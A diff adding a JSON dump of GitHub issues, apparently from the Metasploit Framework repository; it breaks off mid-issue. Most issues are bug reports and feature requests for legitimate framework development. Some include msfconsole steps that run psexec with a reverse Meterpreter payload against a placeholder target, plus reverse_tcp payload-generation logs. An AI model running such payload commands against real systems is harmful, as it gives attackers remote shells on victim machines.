@@ -1,0 +1,368 @@
+[
+    {
+        "id": 4874330045,
+        "number": 21673,
+        "title": "Record a video demo of upcoming Malleable C2 Features for 6.5",
+        "state": "open",
+        "created_at": "2026-07-13T13:57:21Z",
+        "updated_at": "2026-07-13T13:57:21Z",
+        "closed_at": null,
+        "author": "smcintyre-r7",
+        "comments": 0,
+        "labels": [
+            "suggestion-docs"
+        ],
+        "assignees": [
+            "dledda-r7"
+        ],
+        "locked": false,
+        "body": "We should record a video demonstration and walk through of the new malleable C2 functionality that will be released in the upcoming 6.5 version.\n\nWe'll post the result to our YouTube channel. We may also want to link to it in our docs.",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21673"
+    },
+    {
+        "id": 4858745163,
+        "number": 21669,
+        "title": "Installation Instructions Slightly Outdated - Suggested Improvements Included",
+        "state": "open",
+        "created_at": "2026-07-10T21:23:27Z",
+        "updated_at": "2026-07-11T07:38:46Z",
+        "closed_at": null,
+        "author": "tekwizz123",
+        "comments": 1,
+        "labels": [
+            "suggestion-docs"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "## Summary\n\nThe page at https://docs.metasploit.com/docs/development/get-started/setting-up-a-metasploit-development-environment.html is somewhat outdated as it does not mention that now to install Ruby from scratch using rbenv you also need to run the following commands:\n\n- `sudo apt install libffi-dev`\n- `sudo apt install libyaml-dev`\n\n### Motivation\n\nEnsure documentation is up to date to help onboard new developers and ensure a smoother on-boarding experience for those who wish to contribute to Metasploit.\n\n## Steps to resolve this issue\n\nUpdate the Linux install steps from\n\n`sudo apt update && sudo apt install -y git autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev`\n\nTo this\n\n`sudo apt update && sudo apt install -y git autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev libffi-dev libyaml-dev`",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21669"
+    },
+    {
+        "id": 4821542150,
+        "number": 21650,
+        "title": "MCP Plugin Blocks Ctrl+C",
+        "state": "open",
+        "created_at": "2026-07-06T17:26:58Z",
+        "updated_at": "2026-07-08T12:33:11Z",
+        "closed_at": null,
+        "author": "smcintyre-r7",
+        "comments": 4,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [
+            "dwelch-r7",
+            "kx7m2qd"
+        ],
+        "locked": false,
+        "body": "## Steps to reproduce\n\n1. Start msfconsole, then load the `mcp` plugin\n2. Start the MCP server with `mcp start`\n3. Prese `Ctrl+C` and see that the normal interrupt message is not displayed, presumably meaning that Ctrl+C is no longer being handled in the same way as it was before the MCP server was started.\n\n## Were you following a specific guide/tutorial or reading documentation?\n\n[If yes link the guide/tutorial or documentation you were following here, otherwise you may omit this section.](https://github.com/rapid7/metasploit-framework/pull/21622#issuecomment-4867560089)\n\n## Expected behavior\n\nCtrl+C should continue to work the same way.\n\n## Current behavior\n\nIt does not appear that Ctrl+C is still working the same way.\n\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21650"
+    },
+    {
+        "id": 4821527071,
+        "number": 21649,
+        "title": "MCP Plugin Does Not Gracefully Handle Bind Failures",
+        "state": "open",
+        "created_at": "2026-07-06T17:24:51Z",
+        "updated_at": "2026-07-06T17:24:51Z",
+        "closed_at": null,
+        "author": "smcintyre-r7",
+        "comments": 0,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [
+            "dwelch-r7"
+        ],
+        "locked": false,
+        "body": "## Steps to reproduce\n\nThe MCP plugin does not gracefully handle bind failures. If `msfmcpd` was already started with `./msfmcpd --mcp-transport http`, then the `mcp start` command fails with an undefined method `stop` exception and can't be started even if `./msfmcpd` is killed.\n\nTo reproduce\n\n1. Start `./msfmcpd --mcp-transport http` and wait for it to be up and running\n2. Leave `msfmcpd` running and start `msfconsole`\n3. Run `load mcp` and start the server with `mcp start`\n4. See:\n\n```\nmsf exploit(windows/smb/psexec) > mcp start\n[*] Auto-started msgrpc - User: msf, Pass: x5vFuDUjvIv5\n[!] Failed to unload auto-started msgrpc: undefined method `stop' for nil\n[-] Failed to start MCP server: RPC authentication failed: Login Failed\n```\n\n5. Stop `msfmcpd` with Ctrl+C and wait for it to shutdown\n6. Run `mcp start` again, see that it's still failing to start even though the ports are available\n\n## Were you following a specific guide/tutorial or reading documentation?\n\n[If yes link the guide/tutorial or documentation you were following here, otherwise you may omit this section.](https://github.com/rapid7/metasploit-framework/pull/21622#issuecomment-4867560089)\n\n## Expected behavior\nThe output should clearly state which server couldn't start (MSGRPC or MCP) and why (the address was unavailable). It should also *not* say that the server was started and then throw an error because if the server fails on startup then it was never started.\n\nIf the MSGRPC server bind succeeds, the plugin should also handle instances where the MCP server then fails to start because that port is already in use.\n\nIn both cases, if the server doesn't start the plugin should be in a consistent state where the services can have their status checked and accurately reported as well as restarted.\n\n## Current behavior\n\nIf the msgrpc server can't start because the ports in use, you get a cryptic `undefined method` error after it's stated that the server started and then it correctly states that it can't authenticate. In this case though, the authentication failed because we couldn't start the server we could authenticate to, so it'd be more informative to tell the user that the MSGRPC server couldn't start rather than that we failed to authenticate to it.\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21649"
+    },
+    {
+        "id": 4789420955,
+        "number": 21635,
+        "title": "windows/meterpreter/reverse_http silently fails to stage when StagerURILength is below the UUID-embedding minimum",
+        "state": "open",
+        "created_at": "2026-07-01T21:44:41Z",
+        "updated_at": "2026-07-06T17:13:00Z",
+        "closed_at": null,
+        "author": "zeroSteiner",
+        "comments": 2,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "## Summary\n\nSetting `StagerURILength` on `windows/meterpreter/reverse_http` (and other HTTP(S) stagers that share `Msf::Payload::UUID::Options#generate_uri_uuid_mode`) to a value below the UUID-embedding minimum causes the stager to connect back successfully but never receive a stage or create a session — with no error or log message of any kind.\n\n## Steps to reproduce\n\n```\nuse exploit/windows/smb/psexec\nset RHOSTS <target>\nset SMBUser ...\nset SMBPass ...\nset payload windows/meterpreter/reverse_http\nset LHOST <lhost>\nset LPORT <lport>\nset StagerURILength 10\nexploit\n```\n\n## Expected behavior\n\nEither the stager stages normally, or the framework raises a clear error/warning explaining that the requested `StagerURILength` is too short.\n\n## Actual behavior\n\n- SMB auth, upload, and service start all succeed.\n- The reverse HTTP handler starts and receives the stager's initial callback request.\n- No \"Staging ... payload\" message is ever printed, no error is printed, and `exploit` reports \"Exploit completed, but no session was created.\" with zero diagnostic output.\n\n## Root cause\n\n- `Msf::Payload::UUID::Options#generate_uri_uuid_mode` (`lib/msf/core/payload/uuid/options.rb`) only embeds a UUID in the generated URI if there's enough room for it (`len >= URI_CHECKSUM_UUID_MIN_LEN`, i.e. `URI_CHECKSUM_MIN_LEN(5) + Msf::Payload::UUID::UriLength(22)` = 27 bytes). Below that, it silently falls back to a bare checksum-only URI with **no embedded UUID** — and only raises an error if `PayloadUUIDSeed`/`PayloadUUIDRaw` was also set.\n- `Msf::Handler::ReverseHttp#on_request` (`lib/msf/core/handler/reverse_http.rb`) gates *all* staging logic behind `if uuid`. When the incoming request's URI has no embedded UUID, it unconditionally overwrites `info[:mode] = :unknown` — discarding whatever checksum-based mode (`:init_native`, etc.) was actually detected.\n- The `:unknown` mode is explicitly excluded from the \"Unknown request to ...\" status print, so this failure path is completely silent.\n\nI confirmed this is present on current `master` (not specific to any feature branch) — the `if uuid ... else info[:mode] = :unknown` gating in `on_request` is unchanged there. The `StagerURILength` option's own advanced-option description (\"The URI length for the stager (at least 5 bytes)\") is also stale/misleading: 5 is `URI_CHECKSUM_MIN_LEN`, not the actual functional minimum needed for a working payload.\n\n## Suggested fix direction\n\nAdd validation in `generate_uri_uuid_mode` (the shared choke point used by windows, windows/x64, java, android, multi, and mettle payloads) to raise a clear error (or at minimum a warning) when `StagerURILength` is set below `URI_CHECKSUM_UUID_MIN_LEN`, rather than silently generating a non-functional payload.\n\nFiling this to track it — not fixing immediately, but don't want it to get lost.\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21635"
+    },
+    {
+        "id": 4787693164,
+        "number": 21634,
+        "title": "Introduction: AI-Powered 0day Disclosure Project with Working Exploits",
+        "state": "closed",
+        "created_at": "2026-07-01T17:09:55Z",
+        "updated_at": "2026-07-06T17:11:07Z",
+        "closed_at": "2026-07-06T17:10:00Z",
+        "author": "Exploit-Garbage",
+        "comments": 1,
+        "labels": [],
+        "assignees": [],
+        "locked": true,
+        "body": "Hi Rapid7/Metasploit team,\n\nI want to share a new open-source project that discovers and discloses 0day vulnerabilities using AI automation.\n\n**Project**: 0day Rubbish  \n**Repository**: https://github.com/Exploit-Garbage/0day-Rubbish\n\n**Project Overview**:\n- Automated AI-driven vulnerability discovery\n- Direct public disclosure with working PoCs\n- Focus on high-impact, widely-deployed systems\n- Standardized disclosure format with complete technical analysis\n\n**Current Disclosure**: Cisco CUCM Remote Code Execution Chain\n- Multi-stage attack: SQLi → XXE → Axis Deployment → Freemarker RCE → Root Access\n- CVSS 9.8 Critical\n- Fully working exploit script included\n\nWe're passionate about advancing automated vulnerability research and believe our discoveries could be valuable additions to Metasploit modules. The exploits are well-documented and tested.\n\nWould love to discuss potential collaboration or module submissions. Our goal is to make security research more efficient and impactful in the AI era.\n\nCheck out our work at: https://github.com/Exploit-Garbage/0day-Rubbish\n\nBest regards,\n0day Rubbish Team",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21634"
+    },
+    {
+        "id": 4783649700,
+        "number": 21629,
+        "title": "Stager for osx TCP meterpreter is broken",
+        "state": "open",
+        "created_at": "2026-07-01T08:02:55Z",
+        "updated_at": "2026-07-01T08:05:59Z",
+        "closed_at": null,
+        "author": "msutovsky-r7",
+        "comments": 0,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [
+            "dledda-r7",
+            "msutovsky-r7"
+        ],
+        "locked": false,
+        "body": "Currently, the staged TCP meterpreter for osx does not work in some of the latest versions of MacOS. \n\nMacOS 14\n```\nresource (/home/ms/Desktop/msf_scripts/osx_malleable_c2.rb)> use payload/osx/x64/meterpreter/reverse_tcp\nresource (/home/ms/Desktop/msf_scripts/osx_malleable_c2.rb)> set lhost tun0\nlhost => 10.38.36.18\nresource (/home/ms/Desktop/msf_scripts/osx_malleable_c2.rb)> set lport 4242\nlport => 4242\nresource (/home/ms/Desktop/msf_scripts/osx_malleable_c2.rb)> generate -f macho -o /tmp/msf1\n[*] Writing 17204 bytes to /tmp/msf1...\nresource (/home/ms/Desktop/msf_scripts/osx_malleable_c2.rb)> to_handler\n`[*] Payload Handler Started as Job 0\n\n[*] Started reverse TCP handler on 10.38.36.18:4242 \nmsf payload(osx/x64/meterpreter/reverse_tcp) > [*] Transmitting first stager...(214 bytes)\n[*] Transmitting second stager...(49152 bytes)\n[*] Sending stage (857592 bytes) to 10.11.58.111\n[-] Meterpreter session 1 is not valid and will be closed\n[*] 10.11.58.111 - Meterpreter session 1 closed.\n```\n\n```\nms@mss-iMac-Pro ~ % ./msf\nmain!\nhello world!\ngood symbol!\ngDyld found, using dual hijack technique.\napis: 4436181088\nconfig: 4495036432\nbase: 4493991936\nsdyld: 4494594048\nErrno: 2\nBuffer: 4437401600\nAnalyzing Segments.\nvmSpace: 925696\nRosetta.\nTranslated: true\nVMAllocate Ret: 0\nLoadAddress: 4438282240\nRegion Ptrs: 140701912622696\nusedCount: 6\nallocCount: 10\nRegion vmOffset: 576460748008456192\nRegion perms: 0\nRegion isZeroFill: 0\nRegion readOnlyData: 0\nRegion fileOffset: 0\nRegion fileSize: 0\n----\nRegion vmOffset: 0\nRegion perms: 5\nRegion isZeroFill: 0\nRegion readOnlyData: 0\nRegion fileOffset: 0\nRegion fileSize: 675840\n----\nErrno: 2\nAddr: 4438282240\nSize: 675840\nPerms: 5\nFlags: 4114\nFD: 4294967295\nOffset: 0\nErrno: 2\nBuffer: 4437401600\nBufferO: 4437401600\nErrno: 2\nSegAddress: 4438282240\nErrno: 2\nRegion vmOffset: 675840\nRegion perms: 3\nRegion isZeroFill: 0\nRegion readOnlyData: 1\nRegion fileOffset: 675840\nRegion fileSize: 16384\n----\nErrno: 2\nAddr: 4438958080\nSize: 16384\nPerms: 3\nFlags: 4114\nFD: 4294967295\nOffset: 675840\nErrno: 2\nBuffer: 4437401600\nBufferO: 4438077440\nErrno: 2\nSegAddress: 4438958080\nErrno: 2\nRegion vmOffset: 692224\nRegion perms: 3\nRegion isZeroFill: 0\nRegion readOnlyData: 0\nRegion fileOffset: 692224\nRegion fileSize: 20480\n----\nErrno: 2\nAddr: 4438974464\nSize: 20480\nPerms: 3\nFlags: 4114\nFD: 4294967295\nOffset: 692224\nErrno: 2\nBuffer: 4437401600\nBufferO: 4438093824\nErrno: 2\nSegAddress: 4438974464\nErrno: 2\nRegion vmOffset: 712704\nRegion perms: 3\nRegion isZeroFill: 1\nRegion readOnlyData: 0\nRegion fileOffset: 0\nRegion fileSize: 45056\n----\nRegion vmOffset: 757760\nRegion perms: 1\nRegion isZeroFill: 0\nRegion readOnlyData: 0\nRegion fileOffset: 712704\nRegion fileSize: 164240\n----\nErrno: 2\nAddr: 4439040000\nSize: 164240\nPerms: 1\nFlags: 4114\nFD: 4294967295\nOffset: 712704\nErrno: 2\nBuffer: 4437401600\nBufferO: 4438114304\nErrno: 2\nSegAddress: 4439040000\nErrno: 2\nLoaded Size: 42\nLoaded first: 4436191168\nLoaded Capacity: 64\nApis: 4436181088\nLoadAddress: 4438282240\nJITLMP: 4494695476\nTopLoader: 4436191696\nToploader (*(int*)this): 1815378276\nLoaded Size: 43\nLoaded Capacity: 64\nLoadAddress: 4438282240\nlateLeaveMapped: 0\nhidden: 0\nMagic: 1815378276\nIsPrebuilt: 0\nlateLeaveMapped: 1\nmainExecutableLoader: 4436184048\nmainExecutableLoader: 4436184048\nLoadedElements: 4436191168\nToploader (*(int*)this): 1815378276\nbuffer: 0\nstartLoaderCount: 42\nnewLoadersCount: 246\nzsh: segmentation fault  ./msf\n```\n\n\nThe bug lies in the stager, specifically, in fileless loading of stager using `gDyld`. Most likely, this is broken due to changed offsets between versions. There's PR ready that disables fileless loading #21621, while we can find more reliable fix. The plan would be to keep staged meterpreter working with this feature disabled and then investigate further this issue and fix it in separate PR.\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21629"
+    },
+    {
+        "id": 4771186207,
+        "number": 21619,
+        "title": "Add an HTTP to SMB Relay Module",
+        "state": "open",
+        "created_at": "2026-06-29T19:57:45Z",
+        "updated_at": "2026-06-29T19:57:45Z",
+        "closed_at": null,
+        "author": "jheysel-r7",
+        "comments": 0,
+        "labels": [
+            "suggestion-module"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "## Summary\n\nThis should allow users to relay HTTP NTLM authentication requests to SMB servers in order to establish SMB sessions on the target host to be used by the framework.\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21619"
+    },
+    {
+        "id": 4770137728,
+        "number": 21617,
+        "title": "when using a bind payload in multi/handler, the options should display LPORT and RPORT?",
+        "state": "closed",
+        "created_at": "2026-06-29T17:10:04Z",
+        "updated_at": "2026-06-29T21:53:07Z",
+        "closed_at": "2026-06-29T21:53:07Z",
+        "author": "jackisace",
+        "comments": 2,
+        "labels": [
+            "question"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "<img width=\"512\" height=\"262\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/904fd6b1-3c09-426e-af6a-c17e2867c7de\" />\n\nMy assumption was that LPORT meant Local PORT, and RHOST meant Remote HOST.\n\nBut its a bind payload, so surely it should say RPORT, instead of LPORT?",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21617"
+    },
+    {
+        "id": 4754221686,
+        "number": 21611,
+        "title": "windows_meterpreter windows-2022 builds are flaky",
+        "state": "open",
+        "created_at": "2026-06-26T18:22:06Z",
+        "updated_at": "2026-06-26T18:22:11Z",
+        "closed_at": null,
+        "author": "smcintyre-r7",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "https://github.com/rapid7/metasploit-framework/actions/runs/27780318928/job/82744789521?pr=21579\n\n```\nFinished in 48 minutes 19 seconds (files took 5.55 seconds to load)\n5 examples, 3 failures\n\nFailed examples:\n\nrspec './spec/acceptance/meterpreter_spec.rb[1:5:2:1:12:1]' # Meterpreter windows_meterpreter staged windows/x64/meterpreter/reverse_tcp windows post/test/socket_channels windows/windows_meterpreter meterpreter successfully opens a session for the \"windows/x64/meterpreter/reverse_tcp\" payload and passes the \"post/test/socket_channels\" tests\nrspec './spec/acceptance/meterpreter_spec.rb[1:5:2:1:5:1]' # Meterpreter windows_meterpreter staged windows/x64/meterpreter/reverse_tcp windows post/test/file windows/windows_meterpreter meterpreter successfully opens a session for the \"windows/x64/meterpreter/reverse_tcp\" payload and passes the \"post/test/file\" tests\nrspec './spec/acceptance/meterpreter_spec.rb[1:5:2:1:10:1]' # Meterpreter windows_meterpreter staged windows/x64/meterpreter/reverse_tcp windows post/test/registry windows/windows_meterpreter meterpreter successfully opens a session for the \"windows/x64/meterpreter/reverse_tcp\" payload and passes the \"post/test/registry\" tests\n\nRandomized with seed 3973\n\nTerminate batch job (Y/N)? \nTerminate batch job (Y/N)? \nError: The operation was canceled.\n```",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21611"
+    },
+    {
+        "id": 4744804409,
+        "number": 21606,
+        "title": "Rubocop rule to enforce module metadata conformity with targets",
+        "state": "closed",
+        "created_at": "2026-06-25T14:40:07Z",
+        "updated_at": "2026-07-07T10:57:49Z",
+        "closed_at": "2026-07-07T10:57:49Z",
+        "author": "sjanusz-r7",
+        "comments": 0,
+        "labels": [
+            "suggestion-feature"
+        ],
+        "assignees": [
+            "sjanusz-r7"
+        ],
+        "locked": false,
+        "body": "## Summary\n\nAs of https://github.com/rapid7/metasploit-framework/pull/20786 we should now enforce those changes in PRs going forward. \n\n### Basic example\n```ruby\ndef initialize(info = {})\n    super(\n      update_info(...\n'Arch' => 'unix',\n'Targets' => [ ... /* define a unix target here */ ... ]\n) )\n```\n\nThe usage of top-level arch, platform etc. can be removed, as the information will get merged from the target.\n\n### Motivation\n\nThis has been called out during module hacking sessions, and we ask contributors to include these changes as blockers before landing modules.\nThis would save our and the contributor cycles.",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21606"
+    },
+    {
+        "id": 4743235956,
+        "number": 21604,
+        "title": "Automatic LPORT selection",
+        "state": "open",
+        "created_at": "2026-06-25T11:08:05Z",
+        "updated_at": "2026-06-29T22:07:26Z",
+        "closed_at": null,
+        "author": "dwelch-r7",
+        "comments": 2,
+        "labels": [
+            "suggestion-feature"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "<!--\n  To make it easier for us to help you, please include as much useful information as possible.\n\n  Useful Links:\n  - Wiki: https://docs.metasploit.com/\n\n  Before opening a new issue, please search existing issues https://github.com/rapid7/metasploit-framework/issues\n-->\n\n## Summary\n\nThis came out of a discussion here https://github.com/rapid7/metasploit-framework/pull/21581#discussion_r3470523247 as part of the smb_to_meterpreter work. \nThe default port for handlers is 4444 so it's likely to have that port not be available when doing something like a session upgrade, the idea is that we would add some logic to search for an available port when the default isn't available.\n\nFew questions still to answer here though:\n1. If a user sets a port and it's in use do we still want to attempt other ports? or do we fail if the port was set explicitly?\n2. Where should it be used? obvious example are the shell/smb/etc to_meterpreter upgrades, should it extend to other modules? or does it only make sense in cases like `sessions -u -1` where we can't directly set the datastore option?\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21604"
+    },
+    {
+        "id": 4736035585,
+        "number": 21601,
+        "title": "Consolidate bind_address/bind_Addresses for reverse handlers",
+        "state": "open",
+        "created_at": "2026-06-24T15:07:29Z",
+        "updated_at": "2026-06-24T15:07:29Z",
+        "closed_at": null,
+        "author": "dwelch-r7",
+        "comments": 0,
+        "labels": [
+            "suggestion-feature"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "<!--\n  To make it easier for us to help you, please include as much useful information as possible.\n\n  Useful Links:\n  - Wiki: https://docs.metasploit.com/\n\n  Before opening a new issue, please search existing issues https://github.com/rapid7/metasploit-framework/issues\n-->\n\n## Summary\n\nWhen reviewing https://github.com/rapid7/metasploit-framework/pull/21552 The contributor needed to make changes to both `reverse.rb`s `bind_addresses` and `reverse_udp.rb`s `bind_address` \nAside form the confusion in the plural/singular names they do (or rather should do) the same thing but oover time have drifted somewhat. We should consolidate these two methods into a single source so future changes only need ot be made in a single place.\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21601"
+    },
+    {
+        "id": 4727138739,
+        "number": 21597,
+        "title": "Modifying a frozen string cause an error in `Exploit::Remote::Ftp` mixin",
+        "state": "open",
+        "created_at": "2026-06-23T15:17:34Z",
+        "updated_at": "2026-06-29T09:38:32Z",
+        "closed_at": null,
+        "author": "cdelafuente-r7",
+        "comments": 1,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "Since we are requiring `# frozen_string_literal: true` on new files now (see [AGENTS.md](https://github.com/rapid7/metasploit-framework/blob/81648e60715389554f3d394955a3d68786569467/AGENTS.md)). The `recv_ftp_resp` method in the `Exploit::Remote::Ftp` mixin is failing. This method tries to modify `@ftpbuff` string (e.g. `@ftpbuff << resp`, `@ftpbuff << left`).\n\n## Steps to reproduce\n\nHow'd you do it?\n\n1. Start a vsftp server with docker:\n```\ndocker run -d --rm -v ${PWD}:/home/vsftpd -p 2020:20 -p 2121:21 -e FTP_USER=myuser -e FTP_PASS=mypass --name vsftpd fauria/vsftpd\n```\n2. Add `# frozen_string_literal: true` at the top of the `modules/auxiliary/dos/ftp/vsftpd_232.rb` file.\n3. Run msfconsole\n4. Load the module: `use auxiliary/dos/ftp/vsftpd_232`\n5. run it: `run verbose=true rhosts=127.0.0.1 rport=2121 username=myuser password=mypass`\n\n## Were you following a specific guide/tutorial or reading documentation?\n\nNo.\n\n## Expected behavior\n\nThe module runs fine.\n\n## Current behavior\n\nIt breaks:\n```\nmsf auxiliary(dos/ftp/vsftpd_232) > run verbose=true rhosts=127.0.0.1 rport=2121 username=myuser password=mypass\n[*] Running module against 127.0.0.1\n[*] 127.0.0.1:2121 - Running automatic check (\"set AutoCheck false\" to disable)\n[*] 127.0.0.1:2121 - Connecting to FTP server...\n[*] 127.0.0.1:2121 - Connected to target FTP server\n[*] 127.0.0.1:2121 - FTP banner: vsFTPd 3.0.2\n[-] 127.0.0.1:2121 - Auxiliary failed: FrozenError can't modify frozen String: \"\"\n[-] 127.0.0.1:2121 - Call stack:\n[-] 127.0.0.1:2121 -   /home/msf/src/metasploit-framework/modules/auxiliary/dos/ftp/vsftpd_232.rb:81:in `block in check'\n[-] 127.0.0.1:2121 -   <internal:kernel>:187:in `loop'\n[-] 127.0.0.1:2121 -   /home/msf/src/metasploit-framework/modules/auxiliary/dos/ftp/vsftpd_232.rb:74:in `check'\n[-] 127.0.0.1:2121 -   /home/msf/src/metasploit-framework/lib/msf/core/exploit/remote/auto_check.rb:43:in `with_prepended_auto_check'\n[-] 127.0.0.1:2121 -   /home/msf/src/metasploit-framework/lib/msf/core/exploit/remote/auto_check.rb:20:in `run'\n```\n\n### Metasploit version\n\n```\nFramework: 6.4.141-dev-81648e60715\nConsole  : 6.4.141-dev-81648e60715\n```",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21597"
+    },
+    {
+        "id": 4710365780,
+        "number": 21591,
+        "title": "Add stdin support for modules",
+        "state": "open",
+        "created_at": "2026-06-21T11:52:46Z",
+        "updated_at": "2026-06-22T16:11:45Z",
+        "closed_at": null,
+        "author": "vognik",
+        "comments": 3,
+        "labels": [
+            "suggestion-feature"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "# Summary\n\nSometimes static values from datastore are not enough.\nFor example, when target services enforces 2FA.\n\nIt can be useful to add a function for user input at runtime.\n\n## Basic example\n\nGhost CMS enforces 2FA by default, and you cannot log in without a code from an email https://github.com/rapid7/metasploit-framework/pull/21234\n\nIn code, it could be useful to use a function that asks the user for a 2FA code at runtime.\n\n```\nres = ghost_request_cgi('POST', 'session', data: {\n  username: datastore['USERNAME'],\n  password: datastore['PASSWORD']\n})\n\nif res&.code == 201\n  print_good('Session established via password.')\n\nelsif res&.body =~ /2FA_NEW_DEVICE_DETECTED/\n  print_warning('Ghost CMS requires a 6-digit verification code from your email.')\n\n  verification_code = input('[*] Enter the 6-digit verification code: ', format: '[0-9]{6}') // <= a new function for user input\n\n  print_status(\"Verifying session with code: #{verification_code}...\")\n  res_verify = ghost_request_cgi('PUT', 'session/verify', data: {\n    token: verification_code\n  })\n\nend\n```\n\n## Motivation\n\nMetasploit does not support runtime input, and because of this, you cannot create exploits for some systems.",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21591"
+    },
+    {
+        "id": 4705428818,
+        "number": 21590,
+        "title": "msfdb init fails on Kali — hardcoded psql -U postgres but that role never gets created",
+        "state": "open",
+        "created_at": "2026-06-20T06:29:38Z",
+        "updated_at": "2026-06-30T05:28:56Z",
+        "closed_at": null,
+        "author": "4ravind-b",
+        "comments": 2,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "Ran into this while setting up a Kali dev environment to test a PR.\n\n### Repro\n\n```bash\ncd metasploit-framework\nbundle exec ruby msfdb delete\nbundle exec ruby msfdb init --debug\n```\n\nEvery role creation step fails with:\n\n```text\npsql: error: connection to server on socket \"...\" failed:\nFATAL: role \"postgres\" does not exist\n```\n\nEventually `msfdb init` crashes with:\n\n```text\nPG::ConnectionBad: connection to server at \"127.0.0.1\", port 5433 failed:\nFATAL: role \"msf\" does not exist\n\nfrom lib/msfdb_helpers/pg_ctlcluster.rb:119:in `create_db_users'\n```\n\nAfter digging into it, it looks like `msfdb` creates the cluster with:\n\n```bash\npg_createcluster ... --user=$(whoami)\n```\n\nwhich means the bootstrap superuser becomes the current Linux user rather than `postgres`.\n\nLater, `run_psql` in `lib/msfdb_helpers/db_interface.rb` assumes a `postgres` role exists and hardcodes:\n\n```ruby\npsql -U postgres ...\n```\n\nAs a result, all of the role creation and alter-role commands in `create_db_users` fail, but those failures aren't surfaced immediately. The first visible exception is the later `PG.connect(... user: msf_db_user ...)` call after the expected roles were never created.\n\nThis isn't PostgreSQL 18 specific — it's the combination of `pg_createcluster --user=$(whoami)` and the hardcoded `psql -U postgres` in `run_psql`, not a recent PostgreSQL change.\n\nThis may be related to #19299. There's also an open proposal around `msfdb` and `postgresql-common` that touches similar code paths.\n\n### Workaround\n\nCreating a `postgres` role manually allows `msfdb init` to complete:\n\n```bash\npsql -U <your-username> -h /tmp -p <port> -d postgres \\\n  -c \"CREATE ROLE postgres SUPERUSER LOGIN;\"\n```\n\nPossible fixes:\n\n* Have `run_psql` connect as the same user passed to `pg_createcluster` instead of hardcoding `postgres`\n* Or explicitly create the cluster with a `postgres` bootstrap user so the existing assumptions remain valid\n\nEnvironment: Kali Linux (rolling), PostgreSQL 18, Ruby 3.3.x.\n\nHappy to test a fix if useful.\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21590"
+    },
+    {
+        "id": 4693136205,
+        "number": 21583,
+        "title": "Investigate adding vulnerable software versions to module metadata",
+        "state": "open",
+        "created_at": "2026-06-18T14:09:47Z",
+        "updated_at": "2026-06-18T14:10:09Z",
+        "closed_at": null,
+        "author": "dwelch-r7",
+        "comments": 0,
+        "labels": [
+            "suggestion-feature"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "<!--\n  To make it easier for us to help you, please include as much useful information as possible.\n\n  Useful Links:\n  - Wiki: https://docs.metasploit.com/\n\n  Before opening a new issue, please search existing issues https://github.com/rapid7/metasploit-framework/issues\n-->\n\n## Summary\n\nLet's investigate the work required to add the vulnerable software versions modules use in their check methods (and elsewhere) into the module metadata and how we can utilise that to enhance things like the MCP server.\n\n### Basic example\nIn the metadata section of a module we could have a section like\n```\nVulnerableVersions => [\n    {'min': 1.2.3, max: '1.2.5'},\n    {'min': 2.2.3, max: '2.2.9'} # Optional have multiple ranges\n]\n```\n\n### Motivation\n\nWe can have generic vulnerability checks if we can get the version number reducing duplicate code across modules and then we'd have the metadata available for other use cases such as the RPC and MCP server and search\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21583"
+    },
+    {
+        "id": 4692808181,
+        "number": 21582,
+        "title": "# MSSQL modules appear broken in 6.4.x releases with `undefined method 'length' for false`",
+        "state": "open",
+        "created_at": "2026-06-18T13:31:27Z",
+        "updated_at": "2026-06-19T18:10:52Z",
+        "closed_at": null,
+        "author": "koptufilim",
+        "comments": 1,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "\n###  MSSQL modules appear broken in 6.4.x releases with `undefined method 'length' for false`\n\n## Environment\n\n### Working versions\n\n* Metasploit Framework 6.3.48-dev\n* Metasploit Framework 6.3.57-dev\n\n### Failing versions\n\n* Metasploit Framework 6.4.126-dev\n* Metasploit Framework 6.4.133-dev\n* Metasploit Framework 6.4.134-dev\n* Metasploit Framework 6.4.135-dev\n\n### Target\n\nMicrosoft SQL Server listening on TCP/1433.\n\nThe same MSSQL targets, credentials, and network paths were used for all tests.\n\nThe issue reproduces against multiple MSSQL servers and from multiple client systems.\n\n## Were you following a specific guide/tutorial or reading documentation?\n\nNo.\n\nThe modules were used according to their built-in documentation (`info`) and their default usage examples.\n\n## Expected behavior\n\nMSSQL modules should successfully communicate with the target server, perform pre-login negotiation, and either:\n\n* authenticate successfully,\n* retrieve version information,\n* or execute their intended functionality.\n\nAt minimum, they should not crash with an unhandled exception.\n\n## Current behavior\n\nSeveral MSSQL-related modules fail before completing their operation.\n\nAffected modules include:\n\n* auxiliary/scanner/mssql/mssql_login\n* auxiliary/scanner/mssql/mssql_version\n* 